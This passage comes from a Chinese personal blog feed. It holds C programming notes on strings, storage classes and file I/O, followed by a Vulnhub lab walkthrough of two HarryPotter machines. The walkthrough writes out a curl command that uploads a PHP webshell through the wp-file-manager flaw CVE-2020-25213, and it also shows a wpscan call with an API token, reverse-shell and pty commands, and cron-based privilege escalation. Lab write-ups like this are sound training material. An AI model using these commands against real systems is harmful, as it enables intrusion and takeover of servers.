class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-comment">//getchar()和 putchar() 每次只处理一个字符</span><br><span class="hljs-keyword">char</span> a;<br>a = getchar();<br><span class="hljs-built_in">putchar</span>(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920143017458.png" alt="image-20210920143017458"></p><h3 id="字符串输入函数"><a href="#字符串输入函数" class="headerlink" title="字符串输入函数"></a>字符串输入函数</h3><p><strong>gets()</strong></p><p><code>gets()</code>：读取整行输入，直至遇到换行 符，然后丢弃换行符，储存其余字符，并在这些字符的末尾添加一个空字符 使其成为一个 C 字符串</p><blockquote><p>gets() 函数无法检验能否容纳输入的所有字符串，会造成缓冲区溢出</p></blockquote><p><strong>fgets()</strong></p><p><code>fgets()</code>：它通过第二个参数来限制读取字符数从而避免了缓冲区溢出的问题，专门用户处理文件输入。<code>fgets()</code> 读取到第二个参数减一处或者换行符处停止（<code>fgets()</code> 会把换行符储存在字符串中），<code>fgets()</code>函数的第3 个参数指明要读入的文件。如果读入从键盘输入的数据，则以stdin（标准输入）作为参数，该标识符定义在<code>stdio.h</code>中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920174340738.png" alt="image-20210920174340738"></p><blockquote><p><code>fputs() </code>不会在末尾加换行符</p></blockquote><p><strong>gets_s()</strong></p><p>相比于<code>gets()</code> 增加了一个参数来限制输入的字符数量</p><p><strong>s_gets()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> * <span class="hljs-title">s_gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * st, <span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> * ret_val;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>ret_val = fgets(st, n, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-keyword">if</span> (ret_val) <span class="hljs-comment">// 即，ret_val != NULL</span><br>&#123;<br><span class="hljs-keyword">while</span> (st[i] != <span class="hljs-string">&#x27;\n&#x27;</span> &amp;&amp; st[i] != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>i++;<br><span class="hljs-keyword">if</span> (st[i] == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>st[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">return</span> ret_val;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>scanf()</strong></p><p>常用，没什么可说的</p><h3 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h3><p><strong>puts()与sprintf()</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920165617542.png" alt="image-20210920165617542"></p><p><strong>fputs()</strong></p><p><code>fputs()</code>：它的第二个参数指定需要写入的文件位置，如果是输出的话就是<code>stdout</code>它不会在末尾添加换行符</p><p><strong>printf()</strong></p><p>常用的打印函数</p><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><p><strong>strlen()</strong></p><p><code>strlen()</code> 统计字符串长度，忽略末尾的 <code>\0</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920180046351.png" alt="image-20210920180046351"></p><p><strong>strcat() strncat()</strong></p><p><code>strcat()</code>：字符串拼接，第一个参数为需要拼接的参数，第二个参数就是拼接上的字符串，无法检测第一个参数是否可以容纳第二个参数。</p><p><code>strncat()</code>：该函数的第3 个参数指定了最大添加字符数</p><p><strong>strcmp()</strong></p><p><code>strcmp()</code> 字符串比较函数</p><blockquote><p><code>strcmp()</code>函数比较的是字符串，不是字符，所以其参数应该是字符串</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920181023733.png" alt="image-20210920181023733"></p><p><strong>strncmp()</strong></p><p><code>strcmp()</code>函数比较字符串中的字符，直到发现不同的字符为止，这一过 程可能会持续到字符串的末尾，它可以设置比较到哪一位截至。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920181409653.png" alt="image-20210920181409653"></p><p>  <strong>strcpy()  strncpy()</strong></p><p><code>strcpy()</code> </p><ul><li><code>strcpy()</code>：返回类型是 <code>char *</code>，该函数返回的是一个参数的值即第一个参数的地址</li><li>第一个参数不必指向数组的开始，这个属性可用于拷贝数组的一部分</li><li><code>strcpy()</code>把源字符串中的<strong>空字符也拷贝在内</strong></li></ul><p><code>strncpy()</code></p><p><code>strcpy()</code>和 <code>strcat()</code>都有同样的问题，它们都不能检查目标空间是否能容 纳源字符串的副本，<code>strncpy()</code> 该函数的第三个参数是指明可以拷贝的最大字符串。</p><h3 id="命令行输入"><a href="#命令行输入" class="headerlink" title="命令行输入"></a>命令行输入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// argc 表示参数个数</span><br><span class="hljs-comment">// argv[] 参数数组</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>存储类别 链接和内存管理</title>
    <link href="/2021/09/21/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2021/09/21/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="存储类别、链接和内存管理"><a href="#存储类别、链接和内存管理" class="headerlink" title="存储类别、链接和内存管理"></a>存储类别、链接和内存管理</h1><p>被存储的每个值都占有一定的物理内存，C 语言把这样的一块内存称为对象。</p><p>对象可以存储一个或者多个值，一个对象可能并未存储实际的值，但是它存储实际的值时一定具有相应的大小</p><h2 id="存储类别"><a href="#存储类别" class="headerlink" title="存储类别"></a>存储类别</h2><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>C的作用域：</p><ul><li>块作用域：<code>&#123; &#125;</code></li><li>函数作用域：仅用于函数的 <code>goto</code> 标签</li><li>函数原型作用域：函数的形参</li><li>文件作用域：声明在最开始的变量</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>C 变量有 3 种链接属性：</p><ul><li>外部链接</li><li>内部链接</li><li>无链接</li></ul><p>具有<strong>块作用域、函数作用域或函数原型作用域</strong>的变量都是无链接变量，这意味着这些变量属于定义它们的块、函数或原型私有。</p><p>具有<strong>文件作用域的变量可以是外部链接或内部链接</strong>。<strong>外部链接</strong>变量可以在<strong>多文件程序中</strong>使用，<strong>内部链接</strong>变量只能在一个<strong>翻译单元</strong>中使用。</p><blockquote><p>编译器源代码文件和所有的头文件都看成是一个包含信息的单独文件。这个文件被称为翻译单元 </p></blockquote><p>内部链接的文件作用域称为文件作用域</p><p>外部链接的文件作用域称为全局作用域或者程序作用域</p><blockquote><p>如何知道文件作用域变量是内部链接还是外部链接？可以查看外部定义 中是否使用了存储类别说明符static</p><p><code>int giants = 5;  </code>         // 文件作用域，外部链接 </p><p><code>static int dodgers = 3;</code>   // 文件作用域，内部链接</p><p>对于文件作用域变量，关键字 static表明 了其链接属性，而非存储期</p></blockquote><h3 id="存储期"><a href="#存储期" class="headerlink" title="存储期"></a>存储期</h3><p>存储期描述了通过这些标识符访问的对象的生存期</p><p>C对象有4种存储期：</p><ul><li>静态存储期：程序执行期间一直存在</li><li>线程存储期：用于并发程序设计，程序执行可被分为多个线程，具有线程 存储期的对象，从被声明时到线程结束一直存在</li><li>自动存储期：块作用域的变量通常具有自动存储期，当程序进入定义这些变量的块 时，为这些变量分配内存；当退出这个块时，释放刚才为变量分配的内存</li><li>动态分配存储期</li></ul><h3 id="存储类别-1"><a href="#存储类别-1" class="headerlink" title="存储类别"></a>存储类别</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921135941036.png" alt="image-20210921135941036"></p><p><strong>自动变量</strong></p><p>默认情 况下，声明在块或函数头中的任何变量都属于自动存储类别，变量具有自动存储期意味着，程序在进入该变量声明所在的块时变量存在，程序在退出该块时变量消失</p><blockquote><p>块作用域和无链接意味着只有在变量定义所在的块中才能通过变量名访问该变量</p></blockquote><p>如果内层块中声明的变量与外层块中的变量同名会怎样？内层块会隐藏 外层块的定义。但是离开内层块后，外层块变量的作用域又回到了原来的作 用域</p><p><strong>寄存器变量</strong></p><p>寄存器变量存储在寄存器而不是在内存中，所以无法获取到寄存器变量的地址，与普通变量相比访问和处理的速度较快，大多数方面寄存器变量和自动变量都一样，使用<code>register</code> 来声明寄存器变量</p><blockquote><p>可声明为register的数据类型有限</p></blockquote><h3 id="块作用域的静态变量"><a href="#块作用域的静态变量" class="headerlink" title="块作用域的静态变量"></a>块作用域的静态变量</h3><p>静态的意思是该变量在内存中的地址不变。具有文件作用域的变量自动具有静态存储期。“局部静态变量”是描述具有块作用域的静态变量的另一个术语</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921141811428.png" alt="image-20210921141811428"></p><h3 id="外部链接的静态变量"><a href="#外部链接的静态变量" class="headerlink" title="外部链接的静态变量"></a>外部链接的静态变量</h3><p>外部链接的静态变量具有文件作用域、外部链接和静态存储期</p><p>变量的定义性声明（defining declaration）放 在在所有函数的外面便创建了外部变量，为了指出该函数使用了外部 变量，可以在函数中用关键字extern再次声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> str1;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921142443122.png" alt="image-20210921142443122"></p><h3 id="内部链接的静态变量"><a href="#内部链接的静态变量" class="headerlink" title="内部链接的静态变量"></a>内部链接的静态变量</h3><p>静态存储期、文件作用域和内部链接</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">static <span class="hljs-built_in">int</span> svil = <span class="hljs-number">1</span>; <span class="hljs-comment">// 静态变量，内部链接</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921143327517.png" alt="image-20210921143327517"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921143941199.png" alt="image-20210921143941199"></p><h3 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h3><p><code>malloc()</code>：该函数只有一个参数，那就是需要申请的内存字节数，它会找一个合适的内存空闲块，申请一块匿名地址，返回内存地址的首字节地址。可以将返回值赋值给指针，然后利用指针访问这块地址。</p><p><code>free()</code>：释放之前申请的地址，<strong>申请后一定要记得释放</strong></p><blockquote><p><code>void* p</code> 指向 void 的指针，表示通用指针</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921150438063.png" alt="image-20210921150438063"></p><p><code>calloc()</code>：接受两个无符号整数作为参数，第一个是存储单元类型的数量，第二个每个是存储单元的大小（字节）</p><p><code>calloc()</code>函数还有一个特性：它把块中的所有位都设置为0，<code>calloc()</code>也可以利用<code>free()</code>来释放</p>]]></content>
    
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件操作</title>
    <link href="/2021/09/21/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/09/21/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>从文件读取信息或者将信息写入文件，这种程序与文件的交互形式就是文件重定向</p><h2 id="与文件通信"><a href="#与文件通信" class="headerlink" title="与文件通信"></a>与文件通信</h2><p>文件：通常是已经存储在磁盘或固态硬盘上的一段已命名的存储区。</p><p>C 把文件看成一系列连续的字节，每个字节可以被单独读取，C提供两种文件模式：文本模式和二进制模式</p><h3 id="文本模式-二进制模式"><a href="#文本模式-二进制模式" class="headerlink" title="文本模式 二进制模式"></a>文本模式 二进制模式</h3><p><strong>文件的内容都以二进制形式（0或1）储存</strong>。但是，如果文件最初<strong>使用二进制编码的字符</strong>（例如， ASCII或Unicode）表示文本（就像C字符串那样），该文件就是<strong>文本文件</strong>，其中包含文本内容。如果文件中的<strong>二进制值代 表机器语言代码或数值数据</strong>（使用相同的内部表示，假设，用于long或 double类型的值）或<strong>图片或音乐编码</strong>，该文件就是<strong>二进制文件</strong>，其中包含二进制内容。</p><p>在二进制模式中，程序可以访问文件的每个字节。而在文本模式 中，程序所见的内容和文件的实际内容不同。程序以文本模式读取文件时， 把本地环境表示的行末尾或文件结尾映射为C模式。</p><h3 id="I-O-的级别"><a href="#I-O-的级别" class="headerlink" title="I/O 的级别"></a>I/O 的级别</h3><p>除了选择文件的模式，大多数情况下，还可以选择 I/O 的两个级别（即 处理文件访问的两个级别）。底层I/O（low-level I/O）使用操作系统提供的 基本 I/O 服务。标准高级 I/O（standard high-level I/O）使用 C 库的标准包和 stdio.h 头文件定义。因为无法保证所有的操作系统都使用相同的底层 I/O 模型，C 标准只支持标准I/O 包。有些实现会提供底层库，但是 C 标准建立了可 移植的 I/O 模型，我们主要讨论这些 I/O。</p><h3 id="标准文件"><a href="#标准文件" class="headerlink" title="标准文件"></a>标准文件</h3><p>C 程序会自动打开三个文件，标准输入，标准输出，标准错误输出</p><h2 id="标准-I-O"><a href="#标准-I-O" class="headerlink" title="标准 I/O"></a>标准 I/O</h2><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a><code>fopen()</code></h3><p><code>fopen()</code> ：打开文件，和 python 的类似，文件打开后会返回一个文件指针（FILE* fp），其他 I/O 函数可以利用这个指针指向该文件。</p><p>文件指针 fp 并不指向实际的文件，它指向一个包含文件信息的数据对象，其中包含操作文件的 I/O函数所用的缓冲区信息。因为标准库中的 I/O 函数使用缓冲区，所以它们不仅要知道缓冲区的位置，还要知道缓冲区被填充的程度以及操作哪一个文件。标准 I/O 函数根据这些信息在必要时决定再次填充或清空缓冲区。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921160351234.png" alt="image-20210921160351234"></p><blockquote><p>如果使用任何一种”w”模式（不带x字母）打开一个现有文件，该文件的 内容会被删除，以便程序在一个空白文件中开始操作。然而，如果使用带x 字母的任何一种模式，将无法打开一个现有文件。</p></blockquote><h3 id="getc-putc"><a href="#getc-putc" class="headerlink" title="getc() putc()"></a><code>getc() putc()</code></h3><p>从 <code>fp</code> 指定的文件中获取一个字符：<code>ch = getc(fp)</code></p><p>把字符 <code>ch</code> 放入 FILE 指针 <code>fpout</code> 指定的文件中：<code>puts(ch , fpout)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921162535749.png" alt="image-20210921162535749"></p><h3 id="文件结尾"><a href="#文件结尾" class="headerlink" title="文件结尾"></a>文件结尾</h3><p><code>getc()</code>函数在读取一个字符时发现是文件结尾，它将返 回一个特殊值EOF</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921162741773.png" alt="image-20210921162741773"></p><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a><code>fclose()</code></h3><p><code>fclose(fp)</code>函数关闭 fp 指定的文件，必要时刷新缓冲区。对于较正式的程序，应该检查是否成功关闭文件。如果成功关闭，<code>fclose()</code>函数返回 0 ，否则返回 EOF</p><h3 id="指向标准文件的指针"><a href="#指向标准文件的指针" class="headerlink" title="指向标准文件的指针"></a>指向标准文件的指针</h3><p><code>stdio.h</code>头文件把3个文件指针与3个标准文件相关联，C 程序会自动打开这3个标准文件,这些文件指针都是指向FILE 的指针，所以它们可用作标准I/O函数的参数，</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921163203716.png" alt="image-20210921163203716"></p><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p><code>fprintf() fscanf()</code>：文件I/O函数<code>fprintf()</code>和<code>fscanf()</code>函数的工作方式与<code>printf()</code>和<code>scanf()</code>类似， 区别在于前者需要用第1个参数指定待处理的文件。</p><p><code>fgets() fputs()</code> : </p><p><code>fgets(buf, STLEN, fp);</code></p><p><code>rewind()</code>函数让程序回 到文件开始处，方便 while 循环打印整个文件的内容。注意，<code>rewind()</code>接受一 个文件指针作为参数。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164354552.png" alt="image-20210921164354552"></p><p>随机访问：<code>fseek()</code> <code>ftell()</code></p><p><code>fseek()</code>有3个参数，返回 int 类型的值；<code>ftell()</code>函数返回一个 long 类型的值，表示文件中的当前位置</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164931750.png" alt="image-20210921164931750"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164944854.png" alt="image-20210921164944854"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165007305.png" alt="image-20210921165007305"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165302520.png" alt="image-20210921165302520"></p><p><code>fgetpos() fsetpos()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165525047.png" alt="image-20210921165525047"></p>]]></content>
    
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub靶场</title>
    <link href="/2021/09/05/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    <url>/2021/09/05/Vulnhub%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h1><p><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><h2 id="一、HarryPotter-Aragog"><a href="#一、HarryPotter-Aragog" class="headerlink" title="一、HarryPotter: Aragog"></a>一、HarryPotter: Aragog</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.101</p><p>2个flag</p></blockquote><ol><li>使用<code>nmap</code>发现主机位置</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160201089.png" alt="image-20210810160201089"></p><ol start="2"><li>扫描主机开放的端口</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160406090.png" alt="image-20210810160406090"></p><ol start="3"><li>开放了80端口，尝试直接访问获取一些信息，但是只有一张图片</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160509837.png" alt="image-20210810160509837"></p><ol start="4"><li>尝试扫描目录，获取网站信息</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810161059271.png" alt="image-20210810161059271"></p><ol start="5"><li>访问这个网站发现是一个wordpress搭建的，找到登录框，尝试弱口令登录</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810162556360.png" alt="image-20210810162556360"></p><blockquote><p>更改一下电脑的hosts文件就可以了利用域名跳转</p><p>弱口令，爆破，sql注入都没有用，只能继续查找一些wordpress的其他漏洞了</p></blockquote><ol start="3"><li>使用kali中自带的wpscan工具，扫描wordpress网站的漏洞</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810164905155.png" alt="image-20210810164905155"></p><blockquote><p>网页中好像提示了一下可能有插件漏洞</p></blockquote><p>使用WPscan，需要一个WPscan的API<code>gQumLltdtYVensaeqYQI6Gld1rKoodUNjkgdo0sNObo</code>才能识别有漏洞的插件<code>wpscan --api-token=gQumLltdtYVensaeqYQI6Gld1rKoodUNjkgdo0sNObo --url http://192.168.1.101/blog -e p --plugins-detection aggressive</code><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812153011731.png" alt="image-20210812153011731"></p><p>发现了一个命令执行的漏洞<code>CVE-2020-25213</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154341083.png" alt="image-20210812154341083"></p><ol start="4"><li><p>漏洞利用</p><p>参考：<a href="https://www.cnblogs.com/Salvere-Safe/p/14995249.html">https://www.cnblogs.com/Salvere-Safe/p/14995249.html</a></p><p><code>curl -F cmd=upload -F target=l1_ -F upload[]=@lcdm123.php -XPOST &quot;http://192.168.1.101/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154915266.png" alt="image-20210812154915266"></p><p>访问：<code>http://192.168.1.101/blog/wp-content/plugins/wp-file-manager/lib/files/lcdm123.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154932669.png" alt="image-20210812154932669"></p></li><li><p>上传成功，连接shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812155252745.png" alt="image-20210812155252745"></p></li><li><p>根据作者提示，这里面有两个flag</p><blockquote><p>可以访问网站的配置文件获取各种敏感信息等</p></blockquote><p>在<code>/home</code>目录下发现了第一个flag:angry:</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812161048745.png" alt="image-20210812161048745"></p><p>根据配置文件中的数据库密码登录数据库</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812162133123.png" alt="image-20210812162133123"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812162150099.png" alt="image-20210812162150099"></p><blockquote><p>找一下有没有什么有用的东西，冰蝎上面查不了数据库，所以只能选择反弹shell</p></blockquote></li><li><p>利用kali自带的php反弹shell脚本上传到网站然后执行获取shell <code>/usr/share/webshells/php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812171233121.png" alt="image-20210812171233121"></p><blockquote><p>需要自己修改脚本中的IP</p><p>然后直接执行  python3 -c ‘import pty; pty.spawn(“/bin/bash”);’  获取一个ttyshell</p></blockquote></li><li><p>登录数据库，查看数据库中的内容，获取有效信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812172434886.png" alt="image-20210812172434886"></p><p>在数据库中发现了用户和md5加密的密码，利用md5解密网站解出明文密码，结果为<code>password123</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812174109900.png" alt="image-20210812174109900"></p></li></ol><ol start="9"><li><p>尝试用密码连接shell（不知道为什么就直接想到连接shh了，应该是测试的），连接上后要考虑如何提权</p><ol><li><p><del>SUID提权</del> （未发现可用的命令）</p></li><li><p><del>sudo提权</del>（没有sudo）</p></li><li><p>计划任务提权</p><p>直接查看定时任务，只能看见自己的，然后搜索一下是否存在<code>.sh</code>脚本</p><p><code>find / -name &quot;*.sh&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175029178.png" alt="image-20210812175029178"></p><p>这个好像是一个定时脚本，查看权限，本地可修改</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175106634.png" alt="image-20210812175106634"></p><p>利用<code>pspy</code>查看执行进程的用户<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813094946754.png" alt="image-20210813094946754"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813095033051.png" alt="image-20210813095033051"></p><p>UID为零表示权限为root，并且会定期执行，所以修改脚本中的内容提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175652834.png" alt="image-20210812175652834"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175617973.png" alt="image-20210812175617973"></p><p>成功获取两个flag</p></li></ol></li></ol><p><strong>问题总结</strong></p><ol><li><p>反弹shell时自己编写bash脚本</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812164151619.png" alt="image-20210812164151619"></p><p>成功执行但是没有shell返回</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812164210859.png" alt="image-20210812164210859"></p><blockquote><p>未解决，不知道原因</p></blockquote></li><li><p>无法对pspy64这个工具赋予权限</p><blockquote><p>已解决，上传工具时的用户不同，上传工具我利用的蚁剑，执行是用的ssh，导致权限出现问题，直接利用ssh上传工具即可</p></blockquote></li></ol><p><strong>总结</strong></p><p>总体来说这个靶场比较简单，利用现有漏洞，获取shell，然后获取文件进行提权操作</p><p>参考</p><p><a href="https://nepcodex.com/2021/05/vulnhub-aragog-walkthrough-harry-potter-series/">https://nepcodex.com/2021/05/vulnhub-aragog-walkthrough-harry-potter-series/</a></p><h2 id="二、HarryPotter-Nagini"><a href="#二、HarryPotter-Nagini" class="headerlink" title="二、HarryPotter: Nagini"></a>二、HarryPotter: Nagini</h2><blockquote><p>靶机：192.168.1.12</p><p>kali：192.168.1.15</p><p>windows10 ：192.168.1.7</p><p>3个flag</p></blockquote><p>扫描服务器开放的端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813095946042.png" alt="image-20210813095946042"></p><p>继续扫描，查看网站存在哪些目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813100002238.png" alt="image-20210813100002238"></p><blockquote><p>字典不够强，漏扫了一个关键文件<code>note.txt</code>，找了老半天joomal的漏洞，结果没有找到有用的</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813102611357.png" alt="image-20210813102611357"></p><blockquote><p>看到这个没有更多的思路，先看看大师傅们的提示，再继续吧</p></blockquote><p>可以简单实现HTTP3工具：<a href="https://github.com/cloudflare/quiche%EF%BC%8C%E4%BD%9C%E8%80%85%E6%96%87%E7%AB%A0%EF%BC%9Ahttps://blog.cloudflare.com/enjoy-a-slice-of-quic-and-rust/%EF%BC%88%E5%8D%95%E8%AF%8D%E9%83%BD%E8%AE%A4%E8%AF%86%E5%B0%B1%E6%98%AF%E4%B8%8D%E4%BC%9A%E7%BF%BB%E8%AF%91%EF%BC%89">https://github.com/cloudflare/quiche，作者文章：https://blog.cloudflare.com/enjoy-a-slice-of-quic-and-rust/（单词都认识就是不会翻译）</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> quiche<br>cargo build --examples<br><br>坑：<br>需要使用新版的rust，卸载kali原版：sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">remove</span> rustc<br>下载新版：curl --proto <span class="hljs-string">&#x27;=https&#x27;</span> --tlsv1.<span class="hljs-number">2</span> -sSf http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">sh</span>.rustup.rs | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>编译好了之后进入<code>/quiche/target/debug/examples</code>文件夹，执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813123921031.png" alt="image-20210813123921031"></p><p>访问php文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125241635.png" alt="image-20210813125241635"></p><p>尝试几次备份文件访问：<a href="http://192.168.1.12/joomla/configuration.bak">http://192.168.1.12/joomla/configuration.bak</a> 成功下载，发现数据库信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813124519690.png" alt="image-20210813124519690"></p><p>猜测这个地方可能存在ssrf</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125330724.png" alt="image-20210813125330724"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125418965.png" alt="image-20210813125418965"></p><p>使用<a href="https://github.com/tarunkant/Gopherus%E7%94%9F%E6%88%90payload%EF%BC%8C**payload%E9%9C%80%E8%A6%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%89%8D%E6%9C%89%E6%95%88">https://github.com/tarunkant/Gopherus生成payload，**payload需要二次编码才有效</a>**</p><blockquote><p>MySQL客户端连接登录服务器有两种情况：</p><ol><li>需要密码认证时使用挑战越大模式，服务器先发送salt然后客户端使用salt加密面膜然后验证</li><li>无需密码认证时直接发送TCP/IP数据包就可以了</li></ol></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141426960.png" alt="image-20210813141426960"></p><p>成功返回数据库名，接下来就可以直接执行语句获取数据库内容了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813134232814.png" alt="image-20210813134232814"></p><p><img 